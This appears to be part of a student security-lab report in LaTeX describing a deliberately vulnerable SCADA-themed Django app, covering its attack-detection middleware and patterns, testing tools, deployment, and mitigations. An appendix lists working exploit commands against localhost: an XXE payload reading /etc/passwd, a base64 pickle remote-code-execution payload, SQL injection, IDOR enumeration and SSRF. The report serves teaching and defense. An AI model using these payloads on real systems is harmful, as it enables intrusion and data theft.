+    \item \textbf{Automated IP Blocking:} Configurable auto-blocking for CRITICAL attacks
+    \item \textbf{Admin Actions:} One-click IP blocking, session revocation, and log resolution
+    \item \textbf{Statistics Dashboard:} Real-time attack metrics and threat overview
+\end{itemize}
+
+\subsection{Implementation}
+
+\begin{lstlisting}[language=Python]
+class SecurityMonitorMiddleware:
+    def __init__(self, get_response):
+        self.get_response = get_response
+        self.blocked_ips = set(BlockedIP.objects.values_list(
+            'ip_address', flat=True))
+
+    def __call__(self, request):
+        client_ip = request.META.get('REMOTE_ADDR')
+        
+        # Check if IP is blocked
+        if client_ip in self.blocked_ips:
+            return HttpResponse("Access Denied: IP Blocked", status=403)
+        
+        full_path = request.get_full_path()
+        endpoint = request.path
+        body_content = request.body.decode('utf-8', errors='ignore')
+        
+        attack_detected = None
+        
+        # Endpoint-specific detection (13 attack types)
+        if '/login/' in endpoint:
+            if re.search(r"(?i)(is_admin=true|is_admin=1)", full_path):
+                attack_detected = 'Authentication Bypass (CVE-2025-64459)'
+            # Brute force detection
+            self.check_brute_force(request, client_ip)
+        
+        elif '/dashboard/' in endpoint:
+            if re.search(r"(?i)(connector=OR|is_locked_out=True)", full_path):
+                attack_detected = 'SQL Injection - Filter Bypass'
+        
+        # Cookie manipulation detection
+        if 'sessionid' in request.COOKIES:
+            if self.detect_cookie_manipulation(request):
+                attack_detected = 'Cookie Manipulation Attack'
+        
+        # ... 10 more attack types ...
+        
+        if attack_detected:
+            # Severity classification
+            severity, recommended_action, reverse_action = \
+                self.severity_classifier(attack_detected)
+            
+            # Create detailed log
+            log = AttackLog.objects.create(
+                ip_address=client_ip,
+                endpoint=endpoint,
+                attack_type=attack_detected,
+                payload=full_path[:500],
+                severity=severity,
+                recommended_action=recommended_action,
+                reverse_action=reverse_action
+            )
+            
+            # Conditional auto-blocking for CRITICAL attacks
+            auto_block_enabled = getattr(settings, 'ENABLE_AUTO_BLOCKING', True)
+            if severity == 'CRITICAL' and auto_block_enabled:
+                BlockedIP.objects.create(
+                    ip_address=client_ip,
+                    reason=f"Auto-blocked: {attack_detected}",
+                    blocked_by='System',
+                    related_log=log
+                )
+                log.action_taken = 'AUTO_BLOCKED'
+                log.save()
+                self.blocked_ips.add(client_ip)
+        
+        return self.get_response(request)
+    
+    def severity_classifier(self, attack_type):
+        """Maps attack types to severity levels with actions"""
+        if 'Brute Force' in attack_type:
+            return ('CRITICAL', 
+                    'Block IP immediately and review login logs',
+                    'Unblock IP: BlockedIP.objects.filter(ip="X").delete()')
+        elif 'SQL Injection' in attack_type:
+            return ('CRITICAL',
+                    'Block IP and audit database access logs',
+                    'Unblock IP + Review query logs')
+        elif 'Cookie Manipulation' in attack_type:
+            return ('HIGH',
+                    'Revoke user session and reset cookies',
+                    'User must re-login')
+        elif 'Directory Scanning' in attack_type:
+            return ('MEDIUM',
+                    'Monitor IP for 24h, block if persists',
+                    'Unblock after monitoring period')
+        else:
+            return ('LOW', 'Log and monitor', 'No action required')
+    
+    def check_brute_force(self, request, ip):
+        """Detects brute force attacks (5 attempts in 5 minutes)"""
+        if request.method == 'POST':
+            FailedLoginAttempt.objects.create(
+                ip_address=ip,
+                username=request.POST.get('username', ''),
+                endpoint=request.path
+            )
+            
+            five_min_ago = timezone.now() - timedelta(minutes=5)
+            recent_attempts = FailedLoginAttempt.objects.filter(
+                ip_address=ip,
+                timestamp__gte=five_min_ago
+            ).count()
+            
+            if recent_attempts >= 5:
+                AttackLog.objects.create(
+                    ip_address=ip,
+                    endpoint=request.path,
+                    attack_type='Brute Force Attack - Multiple Failed Logins',
+                    payload=f'{recent_attempts} attempts in 5 minutes',
+                    severity='CRITICAL',
+                    recommended_action='Block IP immediately'
+                )
+    
+    def detect_cookie_manipulation(self, request):
+        """Validates session cookie integrity"""
+        session_id = request.COOKIES.get('sessionid', '')
+        if not session_id:
+            return False
+        
+        # Check for suspicious patterns
+        suspicious = [
+            len(session_id) != 32,  # Django default length
+            not session_id.isalnum(),
+            session_id in ['admin', 'root', '12345']
+        ]
+        return any(suspicious)
+\end{lstlisting}
+
+\subsection{Detection Patterns}
+
+\begin{table}[h]
+\centering
+\begin{tabular}{|p{3.5cm}|p{5cm}|p{2cm}|}
+\hline
+\textbf{Attack Type} & \textbf{Detection Pattern} & \textbf{Severity} \\
+\hline
+Brute Force & 5+ failed logins in 5min & CRITICAL \\
+\hline
+Authentication Bypass & \texttt{is\_admin=true|superuser=} & CRITICAL \\
+\hline
+SQL Injection & \texttt{connector=OR|UNION SELECT} & CRITICAL \\
+\hline
+Cookie Manipulation & Invalid session format/length & HIGH \\
+\hline
+XXE & \texttt{<!ENTITY|SYSTEM.*file://} & HIGH \\
+\hline
+SSRF & \texttt{localhost|127.0.0.1|169.254.*} & HIGH \\
+\hline
+IDOR & Access to admin reports (ID 1-10) & HIGH \\
+\hsline
+Directory Scanning & 20+ 404 errors in 10min & MEDIUM \\
+\hline
+File Upload (CWE-434) & \texttt{.php|.exe|.sh|.py|.bat} & HIGH \\
+\hline
+Deserialization & POST to /deserialize/ & CRITICAL \\
+\hline
+\end{tabular}
+\caption{Attack Detection Patterns with Severity Levels}
+\end{table}
+
+\subsection{Admin Action Interface}
+
+The monitoring dashboard provides administrators with actionable controls:
+
+\begin{lstlisting}[language=Python]
+def block_ip_action(request, log_id):
+    """Manually block an IP from attack log"""
+    log = get_object_or_404(AttackLog, id=log_id)
+    BlockedIP.objects.get_or_create(
+        ip_address=log.ip_address,
+        defaults={
+            'reason': f"Manual block: {log.attack_type}",
+            'blocked_by': request.user.username,
+            'related_log': log
+        }
+    )
+    log.action_taken = 'BLOCKED'
+    log.save()
+    return redirect('log_viewer')
+
+def revoke_session_action(request, log_id):
+    """Revoke user session for suspicious activity"""
+    log = get_object_or_404(AttackLog, id=log_id)
+    # Find and delete sessions from this IP
+    Session.objects.filter(
+        session_data__contains=log.ip_address
+    ).delete()
+    log.action_taken = 'SESSION_REVOKED'
+    log.save()
+    return redirect('log_viewer')
+
+def resolve_log_action(request, log_id):
+    """Mark attack log as resolved"""
+    log = get_object_or_404(AttackLog, id=log_id)
+    notes = request.POST.get('notes', '')
+    log.mark_resolved(request.user.username, notes)
+    return redirect('log_viewer')
+\end{lstlisting}
+
+\subsection{Statistics Dashboard}
+
+Real-time metrics displayed on monitoring page:
+
+\begin{itemize}[leftmargin=*]
+    \item \textbf{Critical Attacks:} Count of CRITICAL severity incidents
+    \item \textbf{High Priority:} Count of HIGH severity incidents  
+    \item \textbf{Unresolved Logs:} Attacks requiring admin review
+    \item \textbf{Blocked IPs:} Currently blacklisted addresses
+\end{itemize}
+
+\subsection{Configurable Auto-Blocking}
+
+The system includes a presentation mode flag:
+
+\begin{lstlisting}[language=Python]
+# settings.py
+ENABLE_AUTO_BLOCKING = False  # Set True for production
+
+# middleware.py checks this before auto-blocking
+auto_block_enabled = getattr(settings, 'ENABLE_AUTO_BLOCKING', True)
+if severity == 'CRITICAL' and auto_block_enabled:
+    # Auto-block the IP
+\end{lstlisting}
+
+This allows demonstrations without interruption while maintaining production-ready blocking capabilities.
+
+\subsection{False Positive Prevention}
+
+To minimize false positives:
+\begin{itemize}[leftmargin=*]
+    \item Endpoint-specific detection (e.g., only check for XXE in upload endpoints)
+    \item Content-based analysis (check request body, not just URL)
+    \item Whitelist approach for normal operations (PDF uploads don't trigger alerts)
+    \item Separate logging for vulnerable and patched versions
+    \item Brute force threshold (5 attempts, not 1-2)
+    \item Directory scanning threshold (20 404s, not occasional mistyped URLs)
+\end{itemize}
+
+\subsection{Log Viewer}
+
+Monitoring logs are accessible at:
+\begin{itemize}[leftmargin=*]
+    \item \texttt{/monitoring/} - Shows attacks on vulnerable version
+    \item \texttt{/monitoring/patched/} - Shows attacks on patched version
+\end{itemize}
+
+Each log entry displays:
+\begin{itemize}[leftmargin=*]
+    \item Timestamp
+    \item Severity badge (color-coded: CRITICAL=red, HIGH=orange, MEDIUM=blue, LOW=gray)
+    \item Attack type classification
+    \item Target endpoint
+    \item Attacker IP address
+    \item Recommended action
+    \item Action buttons (Block IP / Revoke Session / Resolve)
+    \item Resolution status and admin notes
+    \item Payload details (truncated to 500 characters)
+\end{itemize}
+
+The interface includes filtering by severity, action taken, and resolution status.
+
+\newpage
+
+% Testing and Validation
+\section{Testing and Validation}
+
+\subsection{Testing Methodology}
+
+All vulnerabilities were tested using multiple approaches:
+\begin{enumerate}[leftmargin=*]
+    \item \textbf{Manual Testing:} Using curl and browser developer tools
+    \item \textbf{Automated Tools:} Burp Suite, SQLmap, OWASP ZAP
+    \item \textbf{Custom Scripts:} Python scripts for payload generation
+\end{enumerate}
+
+\subsection{Test Results Summary}
+
+\begin{table}[h]
+\centering
+\begin{tabular}{|l|c|c|c|}
+\hline
+\textbf{Vulnerability} & \textbf{Vulnerable} & \textbf{Patched} & \textbf{Monitoring} \\
+\hline
+Auth Bypass & ✓ Exploitable & ✓ Blocked & ✓ Detected \\
+\hline
+SQL Injection & ✓ Exploitable & ✓ Blocked & ✓ Detected \\
+\hline
+IDOR & ✓ Exploitable & ✓ Blocked & ✓ Detected \\
+\hline
+Deserialization & ✓ RCE & ✓ Blocked & ✓ Detected \\
+\hline
+File Upload & ✓ Exploitable & ✓ Blocked & ✓ Detected \\
+\hline
+XXE & ✓ File Read & ✓ Blocked & ✓ Detected \\
+\hline
+Race Condition & ✓ Data Leak & ✓ Blocked & N/A \\
+\hline
+SSRF & ✓ Internal Access & ✓ Blocked & ✓ Detected \\
+\hline
+\end{tabular}
+\caption{Vulnerability Testing Results}
+\end{table}
+
+\subsection{Pentesting Tools Used}
+
+\subsubsection{Burp Suite Community Edition}
+\begin{itemize}[leftmargin=*]
+    \item Proxy for request interception
+    \item Intruder for automated IDOR testing (ID 1-100)
+    \item Repeater for manual payload testing
+\end{itemize}
+
+\subsubsection{SQLmap}
+\begin{lstlisting}[language=bash]
+sqlmap -u "http://localhost:8000/vulnerable/dashboard/?connector=AND" \
+       --cookie="sessionid=abc123" --batch --level=2
+\end{lstlisting}
+
+\subsubsection{curl}
+Used for rapid manual testing and automation:
+\begin{lstlisting}[language=bash]
+# Auth bypass test
+curl "http://localhost:8000/vulnerable/login/?username=test&is_admin=true"
+
+# IDOR enumeration
+for i in {1..100}; do
+  curl "http://localhost:8000/vulnerable/report/?id=$i" -o "report_$i.pdf"
+done
+\end{lstlisting}
+
+\subsection{Database Validation}
+
+Database population verified:
+\begin{lstlisting}[language=bash]
+docker compose exec web python manage.py shell
+>>> from core.models import Device, MaintenanceLog, DiagnosticReport
+>>> Device.objects.count()
+21
+>>> MaintenanceLog.objects.count()
+100
+>>> DiagnosticReport.objects.count()
+51
+>>> Device.objects.get(name="NUCLEAR-CORE-CONTROLLER")
+<Device: NUCLEAR-CORE-CONTROLLER (is_locked_out=True)>
+\end{lstlisting}
+
+Total: 172 records, exceeding the 100-record requirement.
+
+\newpage
+
+% Deployment
+\section{Deployment}
+
+\subsection{Docker Configuration}
+
+\subsubsection{Dockerfile}
+
+\begin{lstlisting}[language=Docker]
+FROM python:3.12-slim
+
+WORKDIR /app
+
+COPY requirements.txt .
+RUN pip install --no-cache-dir -r requirements.txt
+
+COPY . .
+
+EXPOSE 8000
+
+CMD ["python", "manage.py", "runserver", "0.0.0.0:8000"]
+\end{lstlisting}
+
+\subsubsection{docker-compose.yml}
+
+\begin{lstlisting}[language=YAML]
+version: '3.8'
+
+services:
+  web:
+    build: .
+    command: python manage.py runserver 0.0.0.0:8000
+    volumes:
+      - .:/app
+    ports:
+      - "8000:8000"
+    environment:
+      - PYTHONUNBUFFERED=1
+\end{lstlisting}
+
+\subsection{Deployment Steps}
+
+\begin{lstlisting}[language=bash]
+# Clone repository
+git clone https://github.com/orhunburakiyanc/Vulnerable-SCADA-Environment.git
+cd Vulnerable-SCADA-Environment/scada_security_lab
+
+# Start container
+docker compose up -d
+
+# Initialize database
+docker compose exec web python manage.py migrate
+docker compose exec web python manage.py populate_db
+
+# Access application
+# Vulnerable: http://localhost:8000/vulnerable/login/
+# Patched: http://localhost:8000/patched/login/
+# Monitoring: http://localhost:8000/monitoring/
+\end{lstlisting}
+
+\subsection{Volume Mapping}
+
+The \texttt{.:/app} volume mapping enables live code updates:
+\begin{itemize}[leftmargin=*]
+    \item Edit files in VS Code
+    \item Changes instantly reflected in container
+    \item No rebuild required for code changes
+    \item Database persists in \texttt{db.sqlite3} outside container
+\end{itemize}
+
+\newpage
+
+% Security Best Practices
+\section{Security Best Practices}
+
+\subsection{Lessons Learned}
+
+\subsubsection{Input Validation}
+\begin{itemize}[leftmargin=*]
+    \item Always use whitelist approach over blacklist
+    \item Validate data type, length, format, and range
+    \item Never trust client-side validation alone
+\end{itemize}
+
+\subsubsection{Authentication \& Authorization}
+\begin{itemize}[leftmargin=*]
+    \item Explicitly set authorization flags server-side
+    \item Implement role-based access control (RBAC)
+    \item Verify resource ownership before granting access
+    \item Use POST for state-changing operations
+\end{itemize}
+
+\subsubsection{Safe Deserialization}
+\begin{itemize}[leftmargin=*]
+    \item Prefer JSON, Protocol Buffers over pickle
+    \item Validate object types after deserialization
+    \item Implement integrity checks (HMAC signatures)
+\end{itemize}
+
+\subsubsection{File Operations}
+\begin{itemize}[leftmargin=*]
+    \item Use UUID-based filenames to prevent collisions
+    \item Generate unique temp files per request
+    \item Clean up temporary files after use
+    \item Whitelist allowed file extensions and MIME types
+\end{itemize}
+
+\subsection{Recommended Security Headers}
+
+\begin{lstlisting}[language=Python]
+# settings.py
+SECURE_BROWSER_XSS_FILTER = True
+SECURE_CONTENT_TYPE_NOSNIFF = True
+X_FRAME_OPTIONS = 'DENY'
+CSRF_COOKIE_SECURE = True
+SESSION_COOKIE_SECURE = True
+SESSION_COOKIE_HTTPONLY = True
+\end{lstlisting}
+
+\subsection{Dependency Management}
+
+Regular updates required for:
+\begin{itemize}[leftmargin=*]
+    \item Django framework (currently 6.0)
+    \item Third-party libraries (lxml, reportlab, requests)
+    \item Python runtime environment
+\end{itemize}
+
+Use tools like \texttt{pip-audit} or \texttt{safety} to scan for known vulnerabilities:
+
+\begin{lstlisting}[language=bash]
+pip install safety
+safety check
+\end{lstlisting}
+
+% Conclusion
+\section{Conclusion}
+
+\subsection{Project Achievements}
+
+This project successfully:
+\begin{itemize}[leftmargin=*]
+    \item Implemented 7 critical vulnerabilities with realistic exploitation scenarios
+    \item Demonstrated 2 distinct SQL injection techniques leveraging Django ORM
+    \item Developed secure patched versions using industry best practices
+    \item Created a functional monitoring system with endpoint-specific attack detection
+    \item Populated database with 172 records including hidden exploitation targets
+    \item Containerized the entire application for reproducible deployment
+    \item Documented all vulnerabilities, exploits, and mitigations
+\end{itemize}
+
+\newpage
+
+% References
+\section{References}
+
+\begin{enumerate}[leftmargin=*]
+    \item Django Security Documentation. \url{https://docs.djangoproject.com/en/5.0/topics/security/}
+    
+    \item OWASP Top 10 Web Application Security Risks. \url{https://owasp.org/www-project-top-ten/}
+    
+    \item CWE-434: Unrestricted Upload of File with Dangerous Type. \url{https://cwe.mitre.org/data/definitions/434.html}
+    
+    \item CVE-2025-64459: Django SQL Injection via Q() Object Manipulation. (Simulated for educational purposes)
+    
+    \item PortSwigger Web Security Academy. \url{https://portswigger.net/web-security}
+    
+    \item Python pickle module documentation. \url{https://docs.python.org/3/library/pickle.html}
+    
+    \item lxml Security Documentation. \url{https://lxml.de/FAQ.html#how-do-i-use-lxml-safely-as-a-web-service-endpoint}
+    
+    \item NIST SP 800-82 Rev. 3: Guide to Operational Technology (OT) Security. \url{https://csrc.nist.gov/publications/detail/sp/800-82/rev-3/final}
+    
+    \item Docker Security Best Practices. \url{https://docs.docker.com/develop/security-best-practices/}
+    
+    \item SQLmap Documentation. \url{https://github.com/sqlmapproject/sqlmap/wiki}
+\end{enumerate}
+
+\newpage
+
+% Appendix
+\appendix
+
+\section{Appendix A: Source Code Repository}
+
+Full source code available at:\\
+\url{https://github.com/orhunburakiyanc/Vulnerable-SCADA-Environment}
+
+Repository structure:
+\begin{itemize}[leftmargin=*]
+    \item \texttt{scada\_security\_lab/} - Main Django project
+    \item \texttt{PENTESTING\_GUIDE.md} - Detailed exploitation guide
+    \item \texttt{create\_pickle\_payload.py} - RCE payload generator
+    \item \texttt{xxe\_attack.xml} - XXE exploitation file
+    \item \texttt{docker-compose.yml} - Container orchestration
+    \item \texttt{requirements.txt} - Python dependencies
+\end{itemize}
+
+\section{Appendix B: Video Demonstration}
+
+Video demonstration covers:
+\begin{enumerate}[leftmargin=*]
+    \item System architecture overview
+    \item Authentication bypass exploitation
+    \item SQL injection with hidden device discovery
+    \item IDOR attack to steal admin secrets
+    \item File upload bypass with malicious files
+    \item XXE to read system files
+    \item Deserialization RCE demonstration
+    \item SSRF internal network scanning
+    \item Monitoring system review
+    \item Patched version security validation
+\end{enumerate}
+
+Video duration: Approximately 30 minutes\\
+[Link to be added after recording]
+
+\section{Appendix C: Database Schema}
+
+\subsection{Device Table}
+\begin{lstlisting}[language=SQL]
+CREATE TABLE core_device (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    name VARCHAR(100) NOT NULL,
+    device_type VARCHAR(50) NOT NULL,
+    status VARCHAR(20) NOT NULL,
+    is_locked_out BOOLEAN DEFAULT 0
+);
+\end{lstlisting}
+
+\subsection{AttackLog Table}
+\begin{lstlisting}[language=SQL]
+CREATE TABLE monitoring_attacklog (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
+    ip_address VARCHAR(45) NOT NULL,
+    endpoint VARCHAR(200) NOT NULL,
+    attack_type VARCHAR(100) NOT NULL,
+    payload TEXT
+);
+\end{lstlisting}
+
+\section{Appendix D: Pentesting Commands}
+
+Quick reference for all exploitation commands:
+
+\begin{lstlisting}[language=bash]
+# Authentication Bypass
+curl "http://localhost:8000/vulnerable/login/?username=hacker&is_admin=true"
+
+# SQL Injection
+curl "http://localhost:8000/vulnerable/dashboard/?connector=OR&is_locked_out=True"
+
+# IDOR
+curl "http://localhost:8000/vulnerable/report/?id=103" -o admin_secret.pdf
+
+# File Upload & Overwrite
+echo "MALICIOUS SCRIPT" > diagnostic_script.txt
+curl -X POST http://localhost:8000/vulnerable/upload/ -F "file=@diagnostic_script.txt"
+
+# XXE
+cat > xxe_attack.xml << 'EOF'
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<data><content>&xxe;</content></data>
+EOF
+curl -X POST http://localhost:8000/vulnerable/upload/ -F "file=@xxe_attack.xml"
+
+# Deserialization RCE
+python3 create_pickle_payload.py
+curl -X POST http://localhost:8000/vulnerable/deserialize/ \
+  -d "diagnostic_data=gASVSwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDBlY2hvICJNQUxJQ0lPVVMgQ09ERSBFWEVDVVRFRCEiID4gL3RtcC9wd25lZC50eHSUhZRSlC4="
+docker compose exec web cat /tmp/pwned.txt
+
+# SSRF
+curl "http://localhost:8000/vulnerable/ssrf/?url=http://localhost:8000/admin/"
+
+# Security Misconfiguration
+curl "http://localhost:8000/vulnerable/login/?username=user&password=fake"
+curl "http://localhost:8000/monitoring/"  # Unauthorized access to logs
+\end{lstlisting}
+
+\end{document}
